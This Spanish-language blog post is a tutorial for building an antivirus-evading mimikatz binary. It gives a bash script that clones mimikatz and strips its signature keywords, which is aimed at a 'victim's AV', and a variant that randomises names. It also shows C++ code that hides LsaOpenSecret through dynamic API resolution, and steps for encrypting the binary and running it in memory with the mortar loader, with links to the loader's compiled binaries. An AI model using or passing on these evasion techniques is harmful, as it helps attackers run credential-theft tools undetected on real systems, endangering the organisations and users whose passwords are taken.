---
layout: single
title:  "Creando nuestro propio binario de mimikatz (indetectable)"
categories: [articulos, AD, malware, bypass]
---

### En este post vamos a cubrir primero un método manual en el que vamos a modificar el código fuente de mimikatz para cambiar y ofuscar las palabras que usa normalmente el binario y luego con el uso de una herramienta terminar de encodearlo y ejecutarlo desde la memoria  

Para hacer esto voy a utilizar la versión de [version de desarrollador de windows ](https://developer.microsoft.com/es-es/windows/downloads/virtual-machines/) con [CommandoVM](https://github.com/mandiant/commando-vm)

Empezando con que ya existen varios artículos de este tema, pero no es español y sobre todo se enfocan en bypassear el [Invoke-Powershell](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) esta vez vamos a ofuscar el binario desde el código fuente 

Veamos que es lo primero que imprime al ejecutar

![mimi_logo](/assets/articulos/custom-mimikatz/primer_mimi.png) 


Como podemos ver, más allá del comportamiento del archivo están las palabras obvias que buscaría un antivirus como 


|  “A La Vie, A L’Amour” | mimikatz, MIMIKATZ |
|http://blog.gentilkiwi.com/mimikatz| DELPY, Benjamin, benjamin@gentilkiwi.com |
|Vincent LE TOUX| creativecommons |
|vincent.letoux@gmail.com| gentilkiwi |
|http://pingcastle.com| KIWI, Kiwi |
|http://mysmartlogon.com|   |


Todas estas palabras del menú indicarían que mimikatz se está ejecutando así que ya tenemos una idea de que es lo primero que vamos a cambiar.
Si buscamos más a fondo en algunas [wikis](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md) encontramos mas palabras clave


- crypto, dpapi, kerberos, lsadump, ngc, sekurlsa
- standard, privilege, process, service, ts, event
- misc, token, vault, minesweeper, net, busylight
- sysenv, sid, iis, rpc, sr98, rdm, acr

Y porque no cambiar el mismo logo del que se encuentra en *mimikatz.c*

![mimi_logo_code](/assets/articulos/custom-mimikatz/mimi_logo.png) 

Aqui hay un [gist](https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781) en el cual con un script buscamos algunas de esas palabras claves y las borramos 

```bash

# This script downloads and slightly "obfuscates" the mimikatz project.
# Most AV solutions block mimikatz based on certain keywords in the binary like "mimikatz", "gentilkiwi", "benjamin@gentilkiwi.com" ..., 
# so removing them from the project before compiling gets us past most of the AV solutions.
# We can even go further and change some functionality keywords like "sekurlsa", "logonpasswords", "lsadump", "minidump", "pth" ....,
# but this needs adapting to the doc, so it has not been done, try it if your victim's AV still detects mimikatz after this program.

git clone https://github.com/gentilkiwi/mimikatz.git windows
mv windows/mimikatz windows/windows
find windows/ -type f -print0 | xargs -0 sed -i 's/mimikatz/windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/WINDOWS/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/Windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/DELPY/James/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Benjamin/Troy/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/jtroy@hotmail.com/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/creativecommons/python/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/MSOffice/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/KIWI/ONEDRIVE/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Onedrive/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/kiwi/onedrive/g'
find windows/ -type f -name '*mimikatz*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/mimikatz/windows/g')";
	mv "${FILE}" "${newfile}";
done02
find windows/ -type f -name '*kiwi*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/kiwi/onedrive/g')";
	mv "${FILE}" "${newfile}";
done

```
Después de investigar un poco he encontrado una versión de este gist, pero con esteroides, con este script no solo cambiamos cada una de las palabras típicas de mimikatz, además cambiamos los nombres de las funciones, de los dll, de los archivos .c cambia hasta el icono del .exe. No lo puedo poner en el artículo porque ocuparía todo

### [mimikatz obfuscator](https://gist.github.com/S3cur3Th1sSh1t/cb040a750f5984c41c8f979040ed112a) <br>(gracias a S3cur3Th1sSh1t por el script)

Si analizamos un poco el código vemos como se mete tanto dentro de los archivos, con los nombres de los archivos, con los nombres y hasta cambiaria la estructura del proyecto entero 


```bash
find windows/ -type f -print0 | xargs -0 sed -i "s/List Kerberos tickets/-/g"

mimi=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 8 | head -n 1)
mv windows/mimikatz windows/$mimi

find windows/ -type f -name "*mimikatz*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/mimikatz/$mimi/g")";
	mv "${FILE}" "${newfile}";
done
```

Es hora de verlo en acción. Pero aún faltan algunas cosas para cambiar del código 


### Notas a tener en cuenta al compilar mimikatz por primera vez   
Si es la primera vez que vais a compilar mimikatz en visual studio code tenéis que tener en cuenta lo siguiente

- Primero en quitar el warning level en *"Project"->Properties->Configuration Properites->General* y ponerlo en W0

 ![warning](/assets/articulos/custom-mimikatz/vscode_log.png) 

 - Después en platform toolset tenemos que poner el *v141_xp* esto normalmente te sale, pero no está instalado, se instala en*"tools"-> Get tools and features*

 ![v141_xp](/assets/articulos/custom-mimikatz/v141_xp.png) 

- Después de tener esto listo ejecutamos nuestro script el cual va a descargar y obfuscar automaticamente, luego se supone que lo guarda en un .zip, pero cada quien lo puede cambiar a que haga lo que quiera
 
*Este proceso tarda 20-30 min*

 ![cmd_obfs](/assets/articulos/custom-mimikatz/cmdobfuscated.png) 

El script debe cambiar el nombre de algunas carpetas como lo hemos visto antes y nos deberia quedar algo asi


 ![folder2](/assets/articulos/custom-mimikatz/folder2.png)<br>

### API imports 

Muchos antivirus detectan el comportamiento de mimikatz por sus llamadas al windows api. Que se conoce como *LSAOpenSecret* así que una forma de ocultar estas llamadas seria con el siguiente código.

```c++

typedef NTSTATUS(__stdcall* _LsaOSecret)(
	__in LSA_HANDLE PolicyHandle,
	__in PLSA_UNICODE_STRING SecretName,
	__in ACCESS_MASK DesiredAccess,
	__out PLSA_HANDLE SecretHandle
	);
char hid_LsaLIB_02zmeaakLCHt[] = { 'a','d','v','a','p','i','3','2','.','D','L','L',0 };
char hid_LsaOSecr_BZxlW5ZBUAAe[] = { 'L','s','a','O','p','e','n','S','e','c','e','t',0 };
HANDLE hhid_LsaLIB_asdasdasd = LoadLibrary(hid_LsaLIB_02zmeaakLCHt);
_LsaOSecret ffLsaOSecret = (_LsaOSecret)GetProcAddress(hhid_LsaL

```

Ocultando *SamEnumerateUserDomain*, *SamOpenUser*, *LsaSetSecret* y mas ya tendriamos casi listo nuestro binario indetectable <br>
*NO* utilizar el mismo codigo, tienes que randomizar aun mas las variables

### mortar

Por ultimo, vamos a terminar de limpiar el binario y a ejecutarlo directamente en la memoria con una heramienta llamada *mortar* que nos va a hacer el proceso de ejecucion aun mas bypasseable <br>
 
[mortar github](https://github.com/0xsp-SRD/mortar)

- Primero le pasamos el .exe que hemos creado antes lo encodea con *encyptor.exe* y despues lo ejecutamos con el *deliver.exe*

Mortar Loader realiza el cifrado y descifrado del binario seleccionado dentro de los flujos de memoria y lo ejecuta directamente sin escribir ningún indicador malicioso en el disco duro. Mortar puede eludir los productos antivirus modernos y las soluciones XDR

mortar es una herramienta hecha en pascal, os dejo los binarios compilados aqui:
[encryptor.exe](/assets/articulos/custom-mimikatz/encryptor.exe) <br>
[deliver.exe](/assets/articulos/custom-mimikatz/deliver.exe) <br>
[agressor.dll](/assets/articulos/custom-mimikatz/agressor.dll) <br>

- Primero le pasamos el mimikatz antes creado para que lo termine de encriptar
![encryptor](/assets/articulos/custom-mimikatz/encryptor.png)<br>

Por último lo ejecutamos de la siguiente manera.

![mimi_run](/assets/articulos/custom-mimikatz/mimi_run.png)<br>

